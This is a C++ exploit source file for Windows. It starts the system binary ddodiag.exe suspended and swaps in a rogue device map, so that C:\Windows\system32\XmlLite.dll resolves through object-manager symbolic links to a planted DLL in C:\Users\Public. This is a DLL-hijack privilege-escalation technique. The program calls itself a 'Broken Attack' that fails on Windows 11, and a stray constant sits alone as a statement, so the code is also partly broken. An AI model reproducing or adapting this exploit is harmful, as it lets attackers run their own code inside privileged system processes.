#include "ntapi.hpp"
#include "otherapi.hpp"

#define MAX_SYMLINK_PATH_COUNT 256
BOOL CreateSymbolicLinkPath(UNICODE_STRING* generatedLinkPath, PWSTR drivePath) {
	HANDLE symlinkHandle = NULL;
	UNICODE_STRING objSymLink;
	UNICODE_STRING objTruePath;
	OBJECT_ATTRIBUTES objAttrSymLink;
	ULONG retLen = FALSE;
	
	__try
	{
		RtlInitUnicodeString(&objSymLink, L"\\??\\C:");
		InitializeObjectAttributes(&objAttrSymLink, &objSymLink, OBJ_CASE_INSENSITIVE, NULL, NULL);

		objTruePath.Length = 0;
		objTruePath.MaximumLength = MAX_SYMLINK_PATH_COUNT * 2;
		objTruePath.Buffer = (PWSTR)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, MAX_SYMLINK_PATH_COUNT * 2);

		if (NtOpenSymbolicLinkObject(&symlinkHandle, GENERIC_READ, &objAttrSymLink) != STATUS_SUCCESS)
			__leave;

		if (NtQuerySymbolicLinkObject(symlinkHandle, &objTruePath, &retLen) != STATUS_SUCCESS)
			__leave;

		retLen = !!swprintf(objTruePath.Buffer, MAX_SYMLINK_PATH_COUNT, L"%s\\%s", objTruePath.Buffer, drivePath);

		generatedLinkPath->Buffer = objTruePath.Buffer;
		generatedLinkPath->Length = lstrlenW(objTruePath.Buffer) * 2;
		generatedLinkPath->MaximumLength = objTruePath.MaximumLength;
	}
	__finally
	{
		if(symlinkHandle)
			NtClose(symlinkHandle);

	}

	return retLen;
}

HANDLE CreateObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName) 
{
	NTSTATUS Status = 0;
	HANDLE DirectoryHandle = NULL;
	UNICODE_STRING ObjectName = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	PUNICODE_STRING lpUnicodeObjectName = NULL;

	if (DirectoryName) 
	{
		RtlInitUnicodeString(&ObjectName, DirectoryName);
		lpUnicodeObjectName = &ObjectName;
	}

	InitializeObjectAttributes(
		&ObjectAttributes,
		lpUnicodeObjectName,
		OBJ_CASE_INSENSITIVE,
		hRoot,
		0);

	Status = NtCreateDirectoryObject(&DirectoryHandle, DIRECTORY_ALL_ACCESS, &ObjectAttributes);
	return DirectoryHandle;
}

int wmain(int argc, wchar_t* argv[])
{
	PEB Peb = { 0 };
	NTSTATUS Status = 0;
	ULONG ProcessId = 0;
	HANDLE hProcess = 0;
	CLIENT_ID ClientId = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	OBJECT_ATTRIBUTES objAttrLlink;
	UNICODE_STRING name;
	UNICODE_STRING target;
	HANDLE DirectoryLinkHandle = NULL;
	HANDLE SymbolicLinkHandle = NULL;
	OBJECT_ATTRIBUTES objAttrDir;

	wprintf(L"[!] Broken Attack_v0.1.2 which hasn't effect on Windows 11, use the other normal one please!!!\n");
	InitializeObjectAttributes(&objAttrDir, NULL, OBJ_CASE_INSENSITIVE, NULL, NULL);
	Status = NtCreateDirectoryObject(&DirectoryLinkHandle, DIRECTORY_ALL_ACCESS, &objAttrDir);
	wprintf(L"[*] 0x%08lx, 0x%p\n", Status, DirectoryLinkHandle);
	if (!NT_SUCCESS(Status))
		return Status;

	STARTUPINFOW StartInfo = { 0 };
	PROCESS_INFORMATION ProcessInfomation = { 0 };
	StartInfo.cb = sizeof(STARTUPINFOW);
	CreateProcessW(
		L"C:\\Windows\\system32\\ddodiag.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		L"C:\\Windows\\system32\\",
		&StartInfo,
		&ProcessInfomation
	);

	wprintf(L"Last Win32Error: %ld\n", NtCurrentTeb()->LastErrorValue);
	wprintf(L"Last NtstatusError: 0x%08lx\n", NtCurrentTeb()->LastStatusValue);
	if (!ProcessInfomation.hProcess)
		return NtCurrentTeb()->LastErrorValue;

	Status = NtSetInformationProcess(ProcessInfomation.hProcess, ProcessDeviceMap, &DirectoryLinkHandle, sizeof(HANDLE));
	wprintf(L"[*] 0x%08lx\n", Status);
	if (!NT_SUCCESS(Status))
		return Status;
	IMAGE_GUARD_DELAYLOAD_IAT_IN_ITS_OWN_SECTION
	//DRIVE_CDROM
	PROCESS_DEVICEMAP_INFORMATION DeviceMap = { 0 };
	HANDLE hTempObject[16] = { 0 };
	HANDLE RemoteTemp = NULL;
	ULONG Count = 0;
	hTempObject[Count++] = CreateObjectDirectory(DirectoryLinkHandle, L"C:");
	hTempObject[Count++] = CreateObjectDirectory(hTempObject[Count-1], L"Windows");
	hTempObject[Count++] = CreateObjectDirectory(hTempObject[Count-1], L"system32");
	Count--;

	// Closed but still existing lol
	NtClose(DirectoryLinkHandle);

	// C:\Users\Public\XmlLite.dll (Da Lao lai jiu yi xia a, bang wo "kernel debug" win 11/win 10 gg QAQ)
	// 可以改到别的盘符，不一定非要 C:\ 下
	CreateSymbolicLinkPath(&target, (PWSTR)L"Users\\Public\\XmlLite.dll");

	wprintf(L"[*] Updating C:\\Windows\\system32\\XmlLite.dll to point to %ls\n", target.Buffer);
	RtlInitUnicodeString(&name, L"XmlLite.dll");
	InitializeObjectAttributes(&objAttrLlink, &name, OBJ_CASE_INSENSITIVE, hTempObject[Count], NULL);

	Status = NtCreateSymbolicLinkObject(&SymbolicLinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &objAttrLlink, &target);
	wprintf(L"[*] 0x%08lx, ObjectName: %ls, target: %ls\n", Status, objAttrLlink.ObjectName->Buffer, target.Buffer);
	if (!NT_SUCCESS(Status))
		return Status;

	Status = NtDuplicateObject(NtCurrentProcess(), SymbolicLinkHandle, ProcessInfomation.hProcess, &RemoteTemp, 0, 0, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
	wprintf(L"[*] NtDuplicateObject 0x%08lx, 0x%p || 0x%p\n", Status, SymbolicLinkHandle, RemoteTemp);

	do
	{
		Status = NtDuplicateObject(NtCurrentProcess(), hTempObject[Count], ProcessInfomation.hProcess, &RemoteTemp, 0, 0, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
	} while (Count--);
	getchar();
	NtResumeThread(ProcessInfomation.hThread, NULL);
	
	return Status;
}